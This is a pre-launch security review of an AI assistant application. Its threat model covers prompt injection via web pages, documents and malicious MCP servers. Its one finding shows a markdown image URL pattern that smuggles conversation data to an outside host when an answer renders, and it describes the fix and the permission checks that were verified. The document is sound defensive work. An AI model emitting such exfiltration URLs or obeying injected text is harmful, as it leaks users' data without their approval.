# Security review before launch (O4), 2026-11-09

Builds on the L2 review (`docs/release/REVIEW-v0.1.md`, section 2), which read every route group and fixed S1–S4 and
L2–L8. This pass looks at what that review did not: what an attacker can do through text the model reads (a web page,
a document, a connector's result) once it shapes an answer or a tool call. A finding is confirmed only by a test that
fails on the tree before the fix.

## Threat model

| Attacker | Reaches SPIKE through | Wants |
|---|---|---|
| A web page, document or file the user gives the model | text the model reads and repeats | the user's data out of the computer, or an action the user did not approve |
| A malicious MCP server the user enabled | tool descriptions and results | the same, or calls to other tools |
| A model answer steered by any of the above | the chat view, tool calls | the same |
| A page in the user's browser | requests to the local server | covered by L2 (Host/Origin, loopback, JSON-only bodies; L1 open) |

## Findings

| ID | Severity | Where | Scenario | Confirmed | State |
|---|---|---|---|---|---|
| O4-1 | Medium | `web/src/components/Markdown.tsx` (`markdownHtml`) | An answer containing `![x](https://host/?d=<data>)`, an `<img>`, `srcset`, a video poster, an audio source, an inline `style` with `url(...)`, a `<style>` element or an SVG `<image>` made the browser contact that host as soon as the answer was shown. Text the model read can ask it to put conversation data (a file it read) into such a URL: data leaves with no approval card, the same as an unapproved `web_fetch` | Yes: `web/src/markdown.test.ts`, 9 failing cases before the fix | **Fixed**: styles, media and SVG references are not rendered; an image from another site becomes a link with its host and "not loaded automatically", which the user can open; local (`/…`, relative) and inline (`data:image/`, `blob:`) images stay. Exported reports use the same function |

## Checked, no finding

- Connector tools cannot replace a built-in tool: their names carry the connector id (`spike/connectors/manager.py`,
  `tool_name`) and the registry gives built-ins precedence (`spike/tools/base.py`, `ToolRegistry.shared_tools`).
  A connector's tools default to `ask`.
- Tools that write, run code or reach the network default to `ask` (`write_file`, `run_python`, `web_fetch`,
  `edit_file`, `run_command`, documents); "always" for a page means its domain only, and sending files or a form is
  confirmed every time (`PermissionBroker.resolve`).
- Charts never load data: the Vega loader refuses every request and specs with `url`, `href` or `image` are refused
  (`web/src/chart.ts`). Artifacts and MCP App views run in sandboxed frames with a CSP that blocks network loads.

## Still to check in this review

Spend limits under parallel calls; secrets in API answers, logs and error messages.
